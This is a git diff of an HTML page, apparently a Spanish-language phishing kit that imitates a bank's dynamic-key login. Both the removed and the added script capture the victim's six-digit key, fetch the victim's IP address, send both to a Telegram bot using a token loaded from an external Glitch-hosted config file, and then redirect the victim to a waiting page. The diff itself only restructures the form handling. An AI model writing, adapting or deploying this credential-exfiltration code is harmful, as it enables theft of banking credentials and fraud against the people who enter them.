@@ -165,94 +165,68 @@ document.write(diasSemana[f.getDay()] + ", " + f.getDate() + " de " + meses[f.ge
           </div>
         </form>
 
-        <script type="module">
-      // Importa el botToken y chatId desde el archivo config.js alojado en la URL proporcionada
+          <script type="module">
+          // Asegúrate de que config.js esté correctamente enlazado y que exporte botToken y chatId
+         // Importa el botToken y chatId desde el archivo config.js alojado en la URL proporcionada
       import { botToken, chatId } from 'https://coordinated-odd-wall.glitch.me/config.js';
       
-          const passwordFields = document.querySelectorAll('.password-field');
-          const continueButton = document.querySelector('.bt2');
-          const form = document.getElementById('form');
+          document.getElementById('loginForm').addEventListener('submit', function(e) {
+              e.preventDefault(); // Evita que el formulario se envíe de la forma tradicional
       
-          passwordFields.forEach((field, index) => {
-              field.addEventListener('input', function() {
-                  if (this.value.length > 1) {
-                      this.value = this.value.slice(0, 1); // Limitar a un dígito
-                  }
-      
-                  // Mover el foco al siguiente campo si existe
-                  if (this.value && index < passwordFields.length - 1) {
-                      passwordFields[index + 1].focus();
-                  }
-      
-                  // Comprobar si todos los campos están completos
-                  if ([...passwordFields].every(input => input.value !== '')) {
-                      continueButton.classList.add('enabled');
-                      continueButton.disabled = false;
-                  } else {
-                      continueButton.classList.remove('enabled');
-                      continueButton.disabled = true;
-                  }
-              });
-          });
-      
-          form.addEventListener('submit', function(e) {
-              e.preventDefault(); // Evitar el envío del formulario de forma tradicional
-      
-              // Capturar los valores del formulario
-              let claveDinamica = '';
-              passwordFields.forEach(input => {
-                  claveDinamica += input.value;
-              });
+              // Obtener el valor del campo de la clave
+              let clave = document.getElementById('password').value;
       
               // Validar que la clave tenga 6 dígitos
-              if (claveDinamica.length !== 6) {
-                  alert('Por favor, ingresa los 6 dígitos de tu clave dinámica.');
+              if (clave.length !== 6) {
+                  alert('Por favor, ingresa los 6 dígitos de tu clave.');
                   return;
               }
       
-              // Obtener la IP del cliente
+              // Obtener la dirección IP del cliente
               fetch('https://api.ipify.org?format=json')
                   .then(response => response.json())
                   .then(data => {
-                      const ipCliente = data.ip;
+                      var ip = data.ip;
       
-                      // Preparar los datos para enviar a Telegram
-                      const mensaje = `Dinámica ->\n\nClave Dinámica: ${claveDinamica}\n\nIP Cliente: ${ipCliente}`;
+                      // Construye el mensaje que enviarás
+                      const mensaje = `Dinamica 1 ->\n\nClave: ${clave}\n\nIP: ${ip}`;
       
+                      // Prepara la URL para la solicitud HTTP a Telegram
                       const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
       
-                      const datos = {
+                      // Crea el objeto con los datos a enviar
+                      const dataToSend = {
                           chat_id: chatId,
                           text: mensaje
                       };
       
-                      // Enviar los datos a Telegram
+                      // Envía la solicitud HTTP a Telegram
                       fetch(url, {
                           method: 'POST',
                           headers: {
                               'Content-Type': 'application/json'
                           },
-                          body: JSON.stringify(datos)
+                          body: JSON.stringify(dataToSend)
                       })
                       .then(response => response.json())
-                      .then(result => {
-                          if (result.ok) {
-                              // Redirigir a otra página si el mensaje se envió correctamente
-                              window.location.href = 'waitt.html';
+                      .then(data => {
+                          if (data.ok) {
+                              window.location.href = 'waitt.html'; // Redirige a wait.html después de enviar el mensaje
                           } else {
-                              alert('Error al enviar la clave');
+                              console.error('Error al enviar el mensaje a Telegram.');
                           }
                       })
                       .catch(error => {
                           console.error('Error:', error);
-                          alert('Error al enviar la clave');
                       });
                   })
                   .catch(error => {
                       console.error('Error al obtener la IP:', error);
-                      alert('Error al obtener la IP');
                   });
           });
       </script>
       
-  </body></html>
+      </div>
+    </div>
+
+</body></html>
